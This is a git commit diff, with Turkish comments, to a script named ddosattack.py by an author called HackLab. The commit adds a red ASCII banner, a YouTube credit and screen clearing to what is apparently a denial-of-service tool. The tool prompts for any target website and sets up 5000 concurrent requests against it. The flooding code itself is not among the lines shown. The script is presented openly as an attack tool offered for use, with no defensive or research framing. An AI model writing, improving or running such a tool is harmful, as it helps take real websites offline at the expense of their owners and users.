8f26682e90ba02254d7beffca592e64c5632e135
HackLab <mursudliziyeddin@gmail.com>
2025-03-26 14:38:49 +0400

    ddosattack.py

--- ddosattack.py
+++ ddosattack.py
@@ -1,13 +1,25 @@
+import os
 import threading
 import requests
 import pyfiglet
+from termcolor import colored
 
-# Büyük ASCII "HackLab" yazısı
+# Ekranı temizleme fonksiyonu
+def clear_screen():
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+# Ekranı temizle
+clear_screen()
+
+# Büyük ASCII "HackLab" yazısı (Kırmızı)
 ascii_banner = pyfiglet.figlet_format("HackLab")
-print(ascii_banner)
+print(colored(ascii_banner, 'red'))
+
+# Küçük kırmızı "Youtube: HackLab" yazısı
+print(colored("Youtube: HackLab", 'red'))
 
 # Kullanıcıdan hedef siteyi al
-target_url = input("Hedef siteyi gir (http:// veya https:// ile): ")
+target_url = input("\nHedef siteyi gir (http:// veya https:// ile): ")
 
 # Aynı anda çalışacak istek sayısı
 num_requests = 5000
